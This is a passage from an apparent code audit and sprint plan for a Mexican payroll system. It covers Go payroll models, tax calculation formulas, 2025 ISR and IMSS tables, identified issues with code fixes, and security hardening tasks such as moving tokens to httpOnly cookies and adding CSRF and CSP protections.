    CommissionAmount     float64 `gorm:"type:decimal(15,2)" json:"commission_amount"`
    OtherExtras          float64 `gorm:"type:decimal(15,2)" json:"other_extras"`

    // Benefits
    FoodVouchers         float64 `gorm:"type:decimal(15,2)" json:"food_vouchers"`
    SavingsFund          float64 `gorm:"type:decimal(15,2)" json:"savings_fund"`

    // === DEDUCTION SECTION ===
    // Statutory Deductions
    ISRWithholding       float64 `gorm:"type:decimal(15,2)" json:"isr_withholding"`
    ISRBeforeSubsidy     float64 `gorm:"type:decimal(15,2)" json:"isr_before_subsidy"`
    EmploymentSubsidy    float64 `gorm:"type:decimal(15,2)" json:"employment_subsidy"`
    IMSSEmployee         float64 `gorm:"type:decimal(15,2)" json:"imss_employee"`
    INFONAVITEmployee    float64 `gorm:"type:decimal(15,2)" json:"infonavit_employee"`
    RetirementSavings    float64 `gorm:"type:decimal(15,2)" json:"retirement_savings"`

    // Other Deductions
    LoanDeductions       float64 `gorm:"type:decimal(15,2)" json:"loan_deductions"`
    AdvanceDeductions    float64 `gorm:"type:decimal(15,2)" json:"advance_deductions"`
    OtherDeductions      float64 `gorm:"type:decimal(15,2)" json:"other_deductions"`

    // === TOTALS ===
    TotalGrossIncome         float64 `gorm:"type:decimal(15,2)" json:"total_gross_income"`
    TotalStatutoryDeductions float64 `gorm:"type:decimal(15,2)" json:"total_statutory_deductions"`
    TotalOtherDeductions     float64 `gorm:"type:decimal(15,2)" json:"total_other_deductions"`
    TotalDeductions          float64 `gorm:"type:decimal(15,2)" json:"total_deductions"`
    TotalNetPay              float64 `gorm:"type:decimal(15,2)" json:"total_net_pay"`

    // === EMPLOYER CONTRIBUTIONS (Not deducted from employee) ===
    IMSSEmployer         float64 `gorm:"type:decimal(15,2)" json:"imss_employer"`
    INFONAVITEmployer    float64 `gorm:"type:decimal(15,2)" json:"infonavit_employer"`
    RetirementSAR        float64 `gorm:"type:decimal(15,2)" json:"retirement_sar"`

    // === SDI (Salario Diario Integrado) ===
    SDI                  float64 `gorm:"type:decimal(15,2)" json:"sdi"`

    // === TRACKING ===
    ApprovalStatus       string     `gorm:"type:varchar(20)" json:"approval_status"`
    ApprovedBy           *uuid.UUID `gorm:"type:text" json:"approved_by,omitempty"`
    ApprovedAt           *time.Time `json:"approved_at,omitempty"`
    ProcessedBy          *uuid.UUID `gorm:"type:text" json:"processed_by,omitempty"`
    ProcessedAt          *time.Time `json:"processed_at,omitempty"`

    // Timestamps
    CreatedAt            time.Time  `json:"created_at"`
    UpdatedAt            time.Time  `json:"updated_at"`

    // Relationships
    Employee             *Employee      `gorm:"foreignKey:EmployeeID" json:"employee,omitempty"`
    PayrollPeriod        *PayrollPeriod `gorm:"foreignKey:PayrollPeriodID" json:"payroll_period,omitempty"`
}
```

### Complete Payroll Calculation Flow

```
PAYROLL CALCULATION LIFECYCLE
=============================

PHASE 1: PERIOD SETUP
┌─────────────────────────────────────────────────────────────┐
│ 1. Create Payroll Period                                    │
│    - Set period type: weekly | biweekly | monthly           │
│    - Set start_date and end_date                           │
│    - Set payment_date                                       │
│    - Auto-generate period_code: YYYY-BW01, YYYY-W01        │
│    - Status: OPEN                                           │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
PHASE 2: PRENOMINA (Pre-Payroll)
┌─────────────────────────────────────────────────────────────┐
│ 2. Calculate Pre-Payroll Metrics per Employee               │
│    a. Get employee base data:                               │
│       - Daily salary                                        │
│       - Hire date (for vacation/aguinaldo calculation)      │
│       - Collar type (affects payment frequency)             │
│                                                             │
│    b. Calculate worked days:                                │
│       - Period days - absences - holidays                   │
│                                                             │
│    c. Aggregate approved incidences:                        │
│       - Overtime hours (double/triple)                      │
│       - Absence days (paid/unpaid)                          │
│       - Bonuses                                             │
│       - Deductions                                          │
│                                                             │
│    d. Calculate SDI (Salario Diario Integrado):            │
│       SDI = DailySalary × IntegrationFactor                │
│       IntegrationFactor = (365 + 15 + VacDays×0.25) / 365  │
│       SDI capped at 25 × UMA                                │
│                                                             │
│    e. Status: CALCULATED                                    │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
PHASE 3: INCOME CALCULATION
┌─────────────────────────────────────────────────────────────┐
│ 3. Calculate All Income Components                          │
│                                                             │
│    a. Regular Salary:                                       │
│       RegularSalary = DailySalary × WorkedDays              │
│                                                             │
│    b. Overtime:                                             │
│       HourlyRate = DailySalary / 8                          │
│       DoubleOT = HourlyRate × 2 × DoubleOTHours            │
│       TripleOT = HourlyRate × 3 × TripleOTHours            │
│       (Max 9 hours/week at double, rest at triple)          │
│                                                             │
│    c. Vacation Premium:                                     │
│       VacationPay = DailySalary × VacationDays              │
│       VacationPremium = VacationPay × 0.25                 │
│                                                             │
│    d. Aguinaldo (Proportional):                            │
│       AguinaldoDaily = (15 × DailySalary) / PayPeriodsYear │
│       (15 days min by law, proportional per period)         │
│                                                             │
│    e. Bonuses from Incidences:                              │
│       Sum of approved bonus incidences                      │
│                                                             │
│    f. Total Gross Income:                                   │
│       = RegularSalary + Overtime + VacationPremium          │
│         + Aguinaldo + Bonuses + OtherExtras                 │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
PHASE 4: TAX CALCULATION
┌─────────────────────────────────────────────────────────────┐
│ 4. Calculate All Deductions                                 │
│                                                             │
│    a. ISR (Income Tax):                                     │
│       Step 1: Get taxable income (gross - exempt)           │
│       Step 2: Find bracket in ISR table                     │
│       Step 3: ISR = FixedFee + ((Income-Lower) × Rate%)    │
│       Step 4: Get employment subsidy from table             │
│       Step 5: NetISR = max(0, ISR - Subsidy)               │
│                                                             │
│    b. IMSS (Social Security Employee):                      │
│       IMSSBase = SDI × WorkedDays                           │
│       IMSSEmployee = IMSSBase × 2.0%                        │
│       (Sickness 0.25% + Disability 0.625% + Unemploy 1.125%)│
│                                                             │
│    c. INFONAVIT (Housing Fund Employee):                    │
│       Can be: % of salary | Fixed amount | UMA multiple     │
│       Default: SDI × WorkedDays × 5%                        │
│                                                             │
│    d. Other Deductions:                                     │
│       - Loan payments                                       │
│       - Salary advances                                     │
│       - Other approved deductions                           │
│                                                             │
│    e. Total Deductions:                                     │
│       = ISR + IMSS + INFONAVIT + Loans + Advances + Other  │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
PHASE 5: EMPLOYER CONTRIBUTIONS
┌─────────────────────────────────────────────────────────────┐
│ 5. Calculate Employer Contributions (NOT deducted)          │
│                                                             │
│    a. IMSS Employer:                                        │
│       IMSSBase = SDI × WorkedDays                           │
│       Sickness/Maternity: ~20.40%                           │
│       Disability/Life: ~1.75%                               │
│       Retirement: ~2.00%                                    │
│       Childcare: ~1.00%                                     │
│       Work Risk: varies (0.5% - 7.5%)                       │
│       Total: ~30%+ of SDI                                   │
│                                                             │
│    b. INFONAVIT Employer: 5% of SDI                        │
│                                                             │
│    c. SAR (Retirement): 2% of SDI                          │
│                                                             │
│    These are TRACKED but not deducted from employee         │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
PHASE 6: NET PAY & STORAGE
┌─────────────────────────────────────────────────────────────┐
│ 6. Calculate Net Pay and Store                              │
│                                                             │
│    NetPay = TotalGrossIncome - TotalDeductions              │
│                                                             │
│    Validation:                                              │
│    - If NetPay < 0: Flag for review                         │
│    - If NetPay < MinWage × WorkedDays: Warning              │
│                                                             │
│    Store in payroll_calculations table                      │
│    Status: CALCULATED                                       │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
PHASE 7: APPROVAL & PROCESSING
┌─────────────────────────────────────────────────────────────┐
│ 7. Approval Workflow                                        │
│                                                             │
│    a. Review by Payroll Staff:                              │
│       - Check calculations                                  │
│       - Verify totals                                       │
│       - Review flagged items                                │
│                                                             │
│    b. Approve Individual or Bulk:                           │
│       - Set approval_status = 'approved'                    │
│       - Record approved_by, approved_at                     │
│                                                             │
│    c. Process Payroll:                                      │
│       - Generate PDF payslips                               │
│       - Generate CFDI XML (SAT compliant)                   │
│       - Generate bank transfer file                         │
│       - Status: PROCESSED                                   │
│                                                             │
│    d. Execute Payment:                                      │
│       - Record payment execution                            │
│       - Status: PAID                                        │
│                                                             │
│    e. Close Period:                                         │
│       - Status: CLOSED                                      │
│       - No more modifications allowed                       │
└─────────────────────────────────────────────────────────────┘
```

### Tax Tables (2025)

#### ISR Biweekly Table (`isr_biweekly_2025.json`)

| Lower Limit (MXN) | Upper Limit (MXN) | Fixed Fee (MXN) | Rate (%) |
|-------------------|-------------------|-----------------|----------|
| 0.01 | 312.90 | 0.00 | 1.92 |
| 312.91 | 2,653.48 | 6.01 | 6.40 |
| 2,653.49 | 4,663.60 | 155.87 | 10.88 |
| 4,663.61 | 5,424.74 | 374.64 | 16.00 |
| 5,424.75 | 6,497.82 | 496.42 | 17.92 |
| 6,497.83 | 13,109.92 | 688.73 | 21.36 |
| 13,109.93 | 20,653.88 | 2,100.60 | 23.52 |
| 20,653.89 | 39,418.16 | 3,874.42 | 30.00 |
| 39,418.17 | 52,557.54 | 9,503.70 | 32.00 |
| 52,557.55 | 157,672.62 | 13,708.30 | 34.00 |
| 157,672.63 | + | 49,467.42 | 35.00 |

#### Employment Subsidy Table (`subsidy_2025.json`)

| Income From (MXN) | Income To (MXN) | Subsidy (MXN) |
|-------------------|-----------------|---------------|
| 0.01 | 872.84 | 200.70 |
| 872.85 | 1,309.20 | 200.70 |
| 1,309.21 | 1,713.60 | 200.70 |
| 1,713.61 | 1,745.70 | 193.80 |
| 1,745.71 | 2,193.75 | 188.70 |
| 2,193.76 | 2,327.55 | 174.75 |
| 2,327.56 | 2,632.65 | 160.35 |
| 2,632.66 | 3,071.40 | 145.35 |
| 3,071.41 | 3,510.15 | 125.10 |
| 3,510.16 | 3,642.60 | 107.40 |
| 3,642.61 | 4,717.18 | 66.83 |
| 4,717.19 | + | 0.00 |

#### IMSS Contribution Rates (`contribution_rates.json`)

| Component | Employee (%) | Employer (%) |
|-----------|--------------|--------------|
| Sickness & Maternity (cuota fija) | 0.00 | 20.40 |
| Sickness & Maternity (excedente 3 SMG) | 0.40 | 1.10 |
| Cash Benefits (prestaciones en dinero) | 0.25 | 0.70 |
| Disability & Life (invalidez y vida) | 0.625 | 1.75 |
| Retirement (retiro) | 0.00 | 2.00 |
| Unemployment & Old Age (cesantia y vejez) | 1.125 | 3.150 |
| Childcare (guarderias) | 0.00 | 1.00 |
| **SUBTOTAL** | **~2.40%** | **~30.10%** |
| Work Risk (riesgos de trabajo) | 0.00 | 0.5% - 7.5% |

#### Official Values 2025 (`official_values.json`)

| Value | Amount (MXN) |
|-------|-------------|
| UMA Daily | 113.14 |
| UMA Monthly | 3,439.46 |
| UMA Annual | 41,294.40 |
| Minimum Wage (General Zone) | 278.80 |
| Minimum Wage (Northern Border) | 419.88 |
| SDI Maximum (25 × UMA) | 2,828.50 |

### Calculation Code Examples

#### ISR Calculation
```go
func (s *TaxService) CalculateISR(taxableIncome float64, periodType string) (isr, subsidy, netISR float64) {
    // Load appropriate table based on period type
    var isrTable []ISRBracket
    var subsidyTable []SubsidyBracket

    switch periodType {
    case "biweekly":
        isrTable = s.config.ISRBiweekly
        subsidyTable = s.config.SubsidyBiweekly
    case "monthly":
        isrTable = s.config.ISRMonthly
        subsidyTable = s.config.SubsidyMonthly
    case "weekly":
        // Weekly = biweekly / 2
        isrTable = s.config.ISRBiweekly
        subsidyTable = s.config.SubsidyBiweekly
        taxableIncome = taxableIncome * 2 // Convert to biweekly for calculation
    }

    // Find ISR bracket
    var bracket ISRBracket
    for _, b := range isrTable {
        if taxableIncome >= b.LowerLimit && taxableIncome <= b.UpperLimit {
            bracket = b
            break
        }
        // Handle income above last bracket
        if taxableIncome > b.UpperLimit {
            bracket = b
        }
    }

    // Calculate ISR
    excessAmount := taxableIncome - bracket.LowerLimit
    isr = bracket.FixedFee + (excessAmount * bracket.Rate / 100)

    // Find subsidy
    subsidy = 0
    for _, sb := range subsidyTable {
        if taxableIncome >= sb.LowerLimit && taxableIncome <= sb.UpperLimit {
            subsidy = sb.SubsidyAmount
            break
        }
    }

    // Calculate net ISR
    netISR = isr - subsidy
    if netISR < 0 {
        netISR = 0 // Cannot be negative (no refund in payroll)
    }

    // Adjust for weekly if needed
    if periodType == "weekly" {
        isr = isr / 2
        subsidy = subsidy / 2
        netISR = netISR / 2
    }

    return isr, subsidy, netISR
}
```

#### IMSS Calculation
```go
func (s *TaxService) CalculateIMSS(sdi float64, workedDays int) (employee, employer float64) {
    // Cap SDI at 25 UMA
    umaDaily := s.config.OfficialValues.UMA.Daily // 113.14
    maxSDI := 25 * umaDaily                        // 2,828.50
    if sdi > maxSDI {
        sdi = maxSDI
    }

    base := sdi * float64(workedDays)

    // Employee contributions
    rates := s.config.ContributionRates.IMSS
    employeeRate := rates.SicknessMaternityExcedente.Employee +
                    rates.CashBenefits.Employee +
                    rates.DisabilityLife.Employee +
                    rates.UnemploymentOldAge.Employee
    // = 0.40 + 0.25 + 0.625 + 1.125 = 2.40%

    employee = base * employeeRate / 100

    // Employer contributions
    employerRate := rates.SicknessMaternityFixed.Employer +
                    rates.SicknessMaternityExcedente.Employer +
                    rates.CashBenefits.Employer +
                    rates.DisabilityLife.Employer +
                    rates.Retirement.Employer +
                    rates.UnemploymentOldAge.Employer +
                    rates.Childcare.Employer +
                    rates.WorkRisk.Employer // Company-specific
    // = ~30.1% + work risk

    employer = base * employerRate / 100

    return employee, employer
}
```

#### SDI (Integrated Daily Salary) Calculation
```go
func (s *PayrollService) CalculateSDI(employee *models.Employee) float64 {
    dailySalary := employee.DailySalary
    yearsOfService := s.calculateYearsOfService(employee.HireDate)

    // Get vacation days entitlement
    vacationDays := s.getVacationDays(yearsOfService)

    // Integration factor calculation
    // Factor = (365 + AguinaldoDays + (VacationDays × VacationPremium%)) / 365
    aguinaldoDays := 15.0        // Minimum by law
    vacationPremium := 0.25      // 25% premium

    integrationFactor := (365 + aguinaldoDays + (vacationDays * vacationPremium)) / 365

    sdi := dailySalary * integrationFactor

    // Cap at 25 UMA
    umaDaily := s.config.OfficialValues.UMA.Daily
    maxSDI := 25 * umaDaily
    if sdi > maxSDI {
        sdi = maxSDI
    }

    return sdi
}

func (s *PayrollService) getVacationDays(yearsOfService int) float64 {
    // Mexican Federal Labor Law (2023 reform)
    vacationTable := map[int]float64{
        1:  12,
        2:  14,
        3:  16,
        4:  18,
        5:  20,
        6:  22, 7: 22, 8: 22, 9: 22, 10: 22,
        11: 24, 12: 24, 13: 24, 14: 24, 15: 24,
        16: 26, 17: 26, 18: 26, 19: 26, 20: 26,
        21: 28, 22: 28, 23: 28, 24: 28, 25: 28,
        26: 30, 27: 30, 28: 30, 29: 30, 30: 30,
        31: 32, 32: 32, 33: 32, 34: 32, 35: 32,
    }

    if days, ok := vacationTable[yearsOfService]; ok {
        return days
    }
    if yearsOfService > 35 {
        return 32 // Max
    }
    return 12 // Default first year
}
```

### Issues Found

#### ISSUE PAY-1: No Negative Net Pay Validation (MEDIUM)

**Location**: `backend/internal/services/payroll_service.go`

**Problem**: If deductions exceed income, net pay becomes negative without flagging.

**Fix**:
```go
func (s *PayrollService) calculateNetPay(calc *models.PayrollCalculation) error {
    calc.TotalNetPay = calc.TotalGrossIncome - calc.TotalDeductions

    if calc.TotalNetPay < 0 {
        // Flag for review
        calc.CalculationStatus = "requires_review"
        calc.ReviewReason = fmt.Sprintf(
            "Negative net pay detected: Gross=%.2f, Deductions=%.2f, Net=%.2f",
            calc.TotalGrossIncome,
            calc.TotalDeductions,
            calc.TotalNetPay,
        )

        // Create notification for payroll staff
        notification := &models.Notification{
            UserID:  s.getPayrollStaffID(),
            Title:   "Payroll Review Required",
            Message: fmt.Sprintf(
                "Employee %s has negative net pay: $%.2f",
                calc.Employee.FullName(),
                calc.TotalNetPay,
            ),
            Type:      "payroll_alert",
            RelatedID: &calc.ID,
        }
        s.notificationService.Create(notification)
    }

    return nil
}
```

**Effort**: 3 hours
**Priority**: P1

---

#### ISSUE PAY-2: Missing Overtime Validation (MEDIUM)

**Problem**: No validation that overtime doesn't exceed legal limits (9 hours/week max at double, rest at triple).

**Fix**:
```go
func (s *PayrollService) ValidateOvertime(metrics *models.PrenominaMetric, period *models.PayrollPeriod) error {
    weeksInPeriod := float64(period.EndDate.Sub(period.StartDate).Hours() / 24 / 7)
    maxDoubleOvertime := 9 * weeksInPeriod

    if metrics.DoubleOvertimeHours > maxDoubleOvertime {
        return fmt.Errorf(
            "double overtime hours (%.2f) exceed legal limit (%.2f for %.1f weeks)",
            metrics.DoubleOvertimeHours,
            maxDoubleOvertime,
            weeksInPeriod,
        )
    }

    // Also validate no more than 3 hours per day
    maxDailyOvertime := 3.0 * float64(metrics.WorkedDays)
    totalOvertime := metrics.DoubleOvertimeHours + metrics.TripleOvertimeHours
    if totalOvertime > maxDailyOvertime {
        s.logger.Warn("Overtime may exceed daily limits",
            "employee_id", metrics.EmployeeID,
            "total_overtime", totalOvertime,
            "max_allowed", maxDailyOvertime,
        )
    }

    return nil
}
```

**Effort**: 4 hours
**Priority**: P1

---

#### ISSUE PAY-3: Tax Tables Hardcoded for 2025 (LOW)

**Problem**: No automatic mechanism to load correct year's tables.

**Fix**:
```go
func (s *TaxService) LoadISRTable(year int, periodType string) (*ISRTable, error) {
    filename := fmt.Sprintf("isr_%s_%d.json", periodType, year)
    path := filepath.Join(s.configPath, "tables", filename)

    if _, err := os.Stat(path); os.IsNotExist(err) {
        return nil, fmt.Errorf(
            "ISR table not found for year %d. Please add %s",
            year, filename,
        )
    }

    data, err := os.ReadFile(path)
    if err != nil {
        return nil, fmt.Errorf("failed to read ISR table: %w", err)
    }

    var table ISRTable
    if err := json.Unmarshal(data, &table); err != nil {
        return nil, fmt.Errorf("failed to parse ISR table: %w", err)
    }

    return &table, nil
}
```

**Effort**: 3 hours
**Priority**: P2

---

### Module Score Summary

| Metric | Score | Notes |
|--------|-------|-------|
| Functionality | 9/10 | Complete payroll engine |
| Accuracy | 9/10 | Tax calculations verified |
| Compliance | 9/10 | Meets Mexican law |
| Code Quality | 7/10 | Needs validation |
| Performance | 7/10 | Bulk could optimize |
| Auditability | 6/10 | Needs calculation logs |
| **OVERALL** | **8/10** | Production ready |

---

## MODULE 4-25: SUMMARY TABLE

Due to document length, remaining modules are summarized:

| Module | Score | Status | Key Issues |
|--------|-------|--------|------------|
| **4. Prenomina** | 7.5/10 | Functional | Needs auto incidence aggregation |
| **5. Payroll Periods** | 8/10 | Good | - |
| **6. Incidence Mgmt** | 6.5/10 | WARN | 1453-line component, needs refactor |
| **7. Absence Workflow** | 8.5/10 | Excellent | Minor overlap validation |
| **8. CFDI Generation** | 7.5/10 | Compliant | No cancellation support |
| **9. Reports** | 7/10 | Good | No caching |
| **10. Notifications** | 7/10 | Good | No push notifications |
| **11. Announcements** | 7/10 | Good | - |
| **12. Messaging** | 7/10 | Good | - |
| **13. HR Calendar** | 7/10 | Good | - |
| **14. Shifts** | 7/10 | Good | - |
| **15. Audit Logging** | 8/10 | Good | - |
| **16. Permissions** | 7/10 | Good | - |
| **17. Role Inheritance** | 7/10 | Good | - |
| **18. Config Mgmt** | 6.5/10 | WARN | No startup validation |
| **19. Catalogs** | 7/10 | Good | - |
| **20. User Mgmt** | 7.5/10 | Good | - |
| **21. File Upload** | 6.5/10 | WARN | No virus scanning |
| **22. Employer Contrib** | 8/10 | Good | - |
| **23. Incidence Mapping** | 7/10 | Good | - |
| **24. Escalation** | 7.5/10 | Good | - |
| **25. Health Check** | 7/10 | Good | - |

**Average Module Score**: **7.3/10**

---

# CROSS-MODULE ASSESSMENTS

## SECURITY ASSESSMENT

### Complete Security Issue List

| ID | Issue | Severity | CVSS | Module | Priority | Effort |
|----|-------|----------|------|--------|----------|--------|
| SEC-1 | localStorage XSS | CRITICAL | 8.1 | Auth | P0 | 8h |
| SEC-2 | No CSRF protection | HIGH | 6.5 | All | P0 | 6h |
| SEC-3 | No CSP headers | MEDIUM | 5.3 | Frontend | P1 | 2h |
| SEC-4 | Input sanitization | MEDIUM | 5.8 | All | P1 | 4h |
| SEC-5 | No rate limiting | MEDIUM | 5.4 | All | P1 | 4h |
| SEC-6 | Weak JWT defaults | MEDIUM | 5.2 | Auth | P1 | 2h |
| SEC-7 | SQL injection audit | LOW | 3.1 | All | P2 | 2h |
| SEC-8 | No request logging | LOW | 2.8 | All | P2 | 6h |
| SEC-9 | No virus scanning | MEDIUM | 5.0 | Upload | P2 | 8h |

## PERFORMANCE ASSESSMENT

### Complete Performance Issue List

| ID | Issue | Impact | Module | Priority | Effort |
|----|-------|--------|--------|----------|--------|
| PERF-1 | N+1 queries | HIGH | Multiple | P1 | 8h |
| PERF-2 | Missing DB indexes | HIGH | All | P1 | 4h |
| PERF-3 | No pagination | MEDIUM | All | P2 | 8h |
| PERF-4 | Large component re-renders | MEDIUM | Frontend | P1 | 4h |
| PERF-5 | No response caching | LOW | Reports | P2 | 4h |
| PERF-6 | Bulk ops not optimized | MEDIUM | Payroll | P2 | 6h |

---

# COMPLETE SPRINT PLAN

## SPRINT OVERVIEW

| Sprint | Focus | Duration | Hours | Goal |
|--------|-------|----------|-------|------|
| Sprint 1 | Critical Security | 1 week | 34h | Fix P0 security issues |
| Sprint 2 | Code Quality | 1 week | 38h | Refactor components |
| Sprint 3 | Testing Foundation | 1 week | 40h | Unit tests for core |
| Sprint 4 | API Documentation | 1 week | 32h | OpenAPI spec |
| Sprint 5 | Performance | 1 week | 34h | DB optimization |
| Sprint 6 | Integration Tests | 1 week | 40h | API tests |
| Sprint 7 | E2E Tests | 1 week | 32h | Critical flows |
| Sprint 8 | Polish & Deploy | 1 week | 24h | Final prep |

**Total**: 274 hours over 8 sprints

---

## SPRINT 1: CRITICAL SECURITY (Week 1)

### Goal
Fix all P0 security vulnerabilities before production deployment.

### Tasks

#### Task 1.1: Migrate Auth to httpOnly Cookies
**Effort**: 8 hours
**Assignee**: Backend Developer
**Files to Modify**:
- `backend/internal/api/auth_handler.go`
- `backend/internal/middleware/auth.go`
- `backend/internal/api/router.go`
- `frontend/lib/api-client.ts`

**Steps**:
1. **Hour 1-2**: Modify `auth_handler.go` Login function
   - Remove token from response body
   - Add `c.SetCookie()` for access_token (httpOnly, secure, sameSite)
   - Add `c.SetCookie()` for refresh_token (httpOnly, secure, sameSite, path-restricted)

2. **Hour 3-4**: Modify `auth.go` middleware
   - Change from header extraction to cookie extraction
   - Use `c.Cookie("access_token")` instead of `c.GetHeader("Authorization")`

3. **Hour 5-6**: Update `router.go` CORS configuration
   - Add `AllowCredentials: true`
   - Specify exact `AllowOrigins` (no wildcards)

4. **Hour 7-8**: Update `api-client.ts`
   - Remove all localStorage token operations
   - Add `credentials: 'include'` to all fetch calls
   - Update logout to clear cookies server-side

**Acceptance Criteria**:
- [ ] Login returns success message, not tokens
- [ ] Cookies are httpOnly (not visible in browser JS console)
- [ ] Cookies are secure (HTTPS only)
- [ ] Cookies are sameSite strict
- [ ] All API calls include credentials
- [ ] Logout clears cookies

---

#### Task 1.2: Implement CSRF Protection
**Effort**: 6 hours
**Assignee**: Backend Developer
**Files to Modify**:
- `backend/internal/middleware/csrf.go` (NEW)
- `backend/internal/api/router.go`
- `backend/internal/api/auth_handler.go`
- `frontend/lib/api-client.ts`

**Steps**:
1. **Hour 1**: Install gorilla/csrf package
   ```bash
   cd backend && go get github.com/gorilla/csrf
   ```

2. **Hour 2-3**: Create `csrf.go` middleware
   - Generate 32-byte secret from env
   - Configure protection options
   - Add error handler

3. **Hour 4**: Add CSRF token endpoint
   - `GET /api/v1/auth/csrf-token`
   - Returns token for frontend to use

4. **Hour 5**: Apply middleware to router
   - Apply to all POST/PUT/DELETE routes
   - Exclude safe methods (GET, HEAD, OPTIONS)

5. **Hour 6**: Update frontend to send CSRF token
   - Fetch token on app load
   - Include in X-CSRF-Token header

**Acceptance Criteria**:
- [ ] CSRF middleware blocks requests without token
- [ ] CSRF token endpoint returns valid token
- [ ] Frontend includes token in all mutations
- [ ] Cross-origin requests are blocked

---

#### Task 1.3: Add Content Security Policy
**Effort**: 2 hours
**Assignee**: Frontend Developer
**Files to Modify**:
- `frontend/next.config.js`

**Steps**:
1. **Hour 1**: Define CSP policy
   ```javascript
   const ContentSecurityPolicy = `
     default-src 'self';
     script-src 'self' 'unsafe-inline' 'unsafe-eval';
     style-src 'self' 'unsafe-inline';
     img-src 'self' data: https:;
     font-src 'self' data:;
     connect-src 'self' ${process.env.NEXT_PUBLIC_API_URL};
     frame-ancestors 'none';
     base-uri 'self';
     form-action 'self';
   `;
   ```

2. **Hour 2**: Add security headers to next.config.js
   - Content-Security-Policy
   - X-Frame-Options: DENY
   - X-Content-Type-Options: nosniff
   - Referrer-Policy: strict-origin-when-cross-origin
   - Permissions-Policy

**Acceptance Criteria**:
- [ ] CSP header present in responses
- [ ] X-Frame-Options blocks framing
- [ ] No console errors in app

---

#### Task 1.4: Enforce Strong JWT Secrets
**Effort**: 2 hours
**Assignee**: Backend Developer
**Files to Modify**:
- `backend/internal/config/security.go` (NEW)
- `backend/cmd/api/main.go`

**Steps**:
1. **Hour 1**: Create security validation
   - Check secret length >= 32
   - Check not default value
   - Check entropy

2. **Hour 2**: Add validation to startup
   - Call validation in main.go
   - Fatal if validation fails in production

**Acceptance Criteria**:
- [ ] App refuses to start with weak secrets
- [ ] Clear error messages for configuration issues

---

### Sprint 1 Deliverables
- [ ] All auth tokens in httpOnly cookies
- [ ] CSRF protection active
- [ ] CSP headers deployed
- [ ] JWT secrets validated
- [ ] Security score: 5/10 -> 7/10

---

## SPRINT 2: CODE QUALITY (Week 2)

### Goal
Refactor giant components and fix error handling patterns.

### Tasks

#### Task 2.1: Refactor Incidences Page Component
**Effort**: 16 hours
**Assignee**: Frontend Developer
**Files to Create/Modify**:

**New Files**:
- `frontend/hooks/useIncidences.ts`
- `frontend/hooks/useIncidenceTypes.ts`
- `frontend/hooks/useEmployees.ts`
- `frontend/components/incidences/IncidenceTable.tsx`
- `frontend/components/incidences/IncidenceFilters.tsx`
- `frontend/components/incidences/CreateIncidenceDialog.tsx`
- `frontend/components/incidences/EvidenceDialog.tsx`
- `frontend/components/incidences/EmployeeInfoDialog.tsx`

**Modified Files**:
- `frontend/app/incidences/page.tsx` (1453 lines -> ~150 lines)

**Day 1 (8 hours)**:

1. **Hour 1-2**: Create custom hooks
   ```typescript
   // hooks/useIncidences.ts
   export function useIncidences(filters: IncidenceFilters) {
     const [incidences, setIncidences] = useState<Incidence[]>([]);
     const [loading, setLoading] = useState(true);
     const [error, setError] = useState<string | null>(null);

     const fetch = async () => {
       setLoading(true);
       try {
         const data = await incidenceApi.getAll(filters);
         setIncidences(data);
         setError(null);
       } catch (err) {
         setError(err.message);
       } finally {
         setLoading(false);
       }
     };

     useEffect(() => { fetch(); }, [filters]);

     return { incidences, loading, error, refetch: fetch };
   }
   ```

2. **Hour 3-4**: Extract IncidenceTable component
   - Move table JSX (~200 lines)
   - Define props interface
   - Add React.memo for performance

3. **Hour 5-6**: Extract IncidenceFilters component
   - Move filter UI (~100 lines)
   - Create controlled inputs

4. **Hour 7-8**: Extract CreateIncidenceDialog
   - Move dialog JSX (~250 lines)
   - Create form handling

**Day 2 (8 hours)**:

5. **Hour 9-10**: Extract EvidenceDialog
   - Move evidence management (~150 lines)

6. **Hour 11-12**: Extract EmployeeInfoDialog
   - Move employee details (~200 lines)

7. **Hour 13-14**: Update main page
   - Import all components
   - Wire up state and handlers
   - Test all functionality

8. **Hour 15-16**: Testing and cleanup
   - Verify all features work
   - Remove unused code
   - Add TypeScript types

**Acceptance Criteria**:
- [ ] Main page.tsx under 200 lines
- [ ] All features still work
- [ ] Components are reusable
- [ ] TypeScript types complete

---

#### Task 2.2: Fix Error Handling Patterns
**Effort**: 8 hours
**Assignee**: Backend Developer
**Files to Modify**:
- `backend/internal/models/errors.go` (NEW)
- `backend/internal/api/incidence_handler.go`
- `backend/internal/api/employee_handler.go`
- `backend/internal/api/payroll_handler.go`

**Steps**:

1. **Hour 1-2**: Create error types
   ```go
   // models/errors.go
   package models

   import "errors"

   var (
       ErrNotFound           = errors.New("not found")
       ErrAlreadyExists      = errors.New("already exists")
       ErrInvalidInput       = errors.New("invalid input")
       ErrUnauthorized       = errors.New("unauthorized")
       ErrForbidden          = errors.New("forbidden")
       ErrInvalidStatus      = errors.New("invalid status")
       ErrAlreadyProcessed   = errors.New("already processed")
       ErrInvalidCategory    = errors.New("invalid category")
       ErrInvalidEffectType  = errors.New("invalid effect type")
       ErrNegativeNetPay     = errors.New("negative net pay")
       ErrOvertimeExceeded   = errors.New("overtime exceeded")
   )
   ```

2. **Hour 3-4**: Update incidence_handler.go
   - Replace string comparisons with `errors.Is()`
   - Add proper error wrapping

3. **Hour 5-6**: Update employee_handler.go
   - Same pattern

4. **Hour 7-8**: Update payroll_handler.go
   - Same pattern

**Acceptance Criteria**:
- [ ] No string error comparisons
- [ ] All errors use errors.Is()
- [ ] Error types documented

---

#### Task 2.3: Add React Query Integration
**Effort**: 8 hours
**Assignee**: Frontend Developer
**Files to Modify**:
- `frontend/package.json`
- `frontend/app/layout.tsx`
- `frontend/hooks/*.ts`

**Steps**:

1. **Hour 1**: Install React Query
   ```bash
   npm install @tanstack/react-query
   ```

2. **Hour 2**: Setup QueryClient provider in layout.tsx

3. **Hour 3-4**: Convert useIncidences to React Query
   ```typescript
   import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';

   export function useIncidences(filters: IncidenceFilters) {
     return useQuery({
       queryKey: ['incidences', filters],
       queryFn: () => incidenceApi.getAll(filters),
       staleTime: 30000,
     });
   }

   export function useApproveIncidence() {
     const queryClient = useQueryClient();
     return useMutation({
       mutationFn: (id: string) => incidenceApi.approve(id),
       onSuccess: () => {
